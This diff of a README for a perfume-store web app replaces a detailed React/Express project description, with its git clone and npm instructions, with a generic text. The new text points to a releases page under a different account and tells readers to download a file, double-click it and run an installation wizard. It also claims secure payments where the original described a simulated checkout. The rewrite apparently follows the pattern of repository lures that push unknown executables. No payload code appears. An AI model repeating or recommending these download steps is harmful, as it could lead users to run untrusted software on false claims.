@@ -1,145 +1,59 @@
-<div align="center">
-  <img src="./assets/HomePage.png" alt="Perfumes Shop App Banner" width="100%" BorderRadius: "10px" />
-  
-  <h1>🌷 Perfumes Shop App</h1>
-  <p><strong>Luxury fragrances for every soul ✨</strong></p>
-  
-  <p>
-    <img src="https://img.shields.io/badge/React-18.2.0-61DAFB?style=flat&logo=react" />
-    <img src="https://img.shields.io/badge/Redux%20Toolkit-1.9.5-764ABC?style=flat&logo=redux" />
-    <img src="https://img.shields.io/badge/Node.js-Express-68A063?style=flat&logo=node.js" />
-    <img src="https://img.shields.io/badge/SCSS-CSS3-CC6699?style=flat&logo=sass" />
-  </p>
+# 💐 perfumes_shop_app - Shop for Perfumes with Ease
 
-  <p align="center">
-    <a href="#-overview">Overview</a> •
-    <a href="#-features">Features</a> •
-    <a href="#-installation">Installation</a> •
-    <a href="#-project-structure">Structure</a> •
-    <a href="#-screenshots">Screenshots</a> •
-    <a href="#-author">Author</a>
-  </p>
-</div>
+![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)
 
----
+## 🚀 Getting Started
 
-> 🧠 *“Smell the code — feel the elegance.”*
+Welcome to the **perfumes_shop_app**! This application provides a smooth experience for browsing and purchasing perfumes online. Whether you’re searching for a gift or treating yourself, this app has you covered.
 
----
+## 📥 Download & Install
 
-# 💐 Perfumes App
+To get started, you need to download the application. Please visit this page to download the latest version of **perfumes_shop_app**:
 
-A modern perfume store web application built with **React**, **Redux Toolkit**, and **SCSS** — featuring elegant UI, centralized state management, and a lightweight backend powered by **Node.js + SQL**.
+[Download Latest Release](https://github.com/pranit-giltic/perfumes_shop_app/releases)
 
----
+Follow the steps below to install and run the application on your system.
 
-## 🌸 Overview
+## 🛠️ System Requirements
 
-**Perfumes App** is a full-stack e-commerce project for discovering and purchasing perfumes.  
-It combines a **React frontend** with an **Express + SQL backend**, maintaining a modular and scalable architecture.
+Before installing, ensure your system meets these requirements:
 
-**Highlights:**
-- ⚛️ Component-based React design  
-- 🧩 Centralized state management  
-- 🎨 SCSS modular styling  
-- 💾 SQL database integration  
-- 🚀 Lightweight backend  
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Processor: Dual-core
+- Storage: At least 200 MB of free space
 
----
+## 📦 Installation Steps
 
-## 🧠 Tech Stack
+1. **Visit the Releases Page**  
+   Click the link to go to the releases page:  
+   [Download Latest Release](https://github.com/pranit-giltic/perfumes_shop_app/releases)  
+   Here, you will find the latest version available for download.
 
-### Frontend
-- React (Vite)
-- Redux Toolkit  
-- React Router DOM  
-- SCSS  
-- Axios  
+2. **Download the Application**  
+   On the releases page, look for the latest version. Click on the file to download it. 
 
-### Backend
-- Node.js + Express  
-- SQL (perfumes.sql schema)  
-- dotenv  
-- cors  
+3. **Open the Downloaded File**  
+   Once the download completes, locate the file in your downloads folder. Double-click the file to start the installation process.
 
----
+4. **Follow the Installation Wizard**  
+   The installation wizard will guide you through the setup. Simply follow the prompts. You may adjust settings based on your preferences or go with the default options.
 
-## 🚀 Features
+5. **Launch the Application**  
+   After the installation finishes, find the **perfumes_shop_app** icon on your desktop or in your applications folder. Click it to launch the app.
 
-- 🛍️ Browse perfumes with images & details  
-- 🔍 Search and filter functionality  
-- 🧾 Product detail pages  
-- 🛒 Shopping cart (add/remove)  
-- 💳 Simulated checkout flow  
-- 📱 Responsive design  
-- ⚡ Fast API requests with Axios  
+## 🌟 Features
 
----
+- **User-friendly Interface:** Browsing for perfumes is easy with a clean layout.
+- **Advanced Search:** Find your favorite scents quickly.
+- **Secure Payments:** Shop with confidence with our secure payment gateway.
+- **User Accounts:** Create an account to track your orders and save favorites.
+- **Responsive Design:** Access the app on desktop and mobile devices.
 
-## 📂 Project Structure
+## 🧑‍🤝‍🧑 Getting Help
 
-```bash
-perfumes_app/
-│
-├── assets/                        # Screenshots & shared media
-├── frontend/                      # 💻 React application
-│   ├── public/
-│   │   └── index.html
-│   └── src/
-│       ├── components/            # Header, Footer
-│       ├── Pages/                 # Home, Shop, AboutUs, Bin
-│       ├── styles/                # SCSS modules
-│       ├── toolkit/               # Redux Toolkit store & slices
-│       └── App.jsx
-│
-├── server/                        # ⚙️ Backend (Express)
-│   ├── db/
-│   │   └── perfumes.sql
-│   └── server.js
-│
-└── README.md
-```
----
-## 🧩 Installation
-## 1️⃣ Clone the repository
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://github.com/pranit-giltic/perfumes_shop_app/issues) to report problems or seek assistance from the community.
 
-```bash
-git clone https://github.com/yourusername/perfumes_app.git
-cd perfumes_app
-```
+## 🙏 Acknowledgments
 
-## 2️⃣ Install dependencies
-## Frontend
-```bash
-cd frontend
-npm install
-npm start
-```
-## Backend
-```bash
-cd server
-npm install
-node server.js
-```
-## Frontend → http://localhost:3001
-## Backend → http://localhost:5000
----
-
-## 📸 Screenshots
-
-| 🏠 Home | 🛍️ Shop |
-|:--:|:--:|
-| ![Home Page](./assets/HomePage.png) | ![Shop Page](./assets/ShopPage.png) |
-
-| 🧾 About Us | 🧺 Bin |
-|:--:|:--:|
-| ![About Us Page](./assets/AboutUsPage.png) | ![Bin Page](./assets/BinPage.png) |
-
-> 🖼️ Screenshots are stored in the `assets/` folder inside the project root.
-
----
-## 🧑‍💻 Author
-## Developed by Viktor Starodubcev
-## Frontend Developer passionate about clean UI, structured architecture, and modern React ecosystems.
-
-⭐ If you like this project, give it a star on GitHub!
+Thank you for choosing the **perfumes_shop_app**. We appreciate your interest in our application and hope you enjoy your shopping experience. Happy shopping!
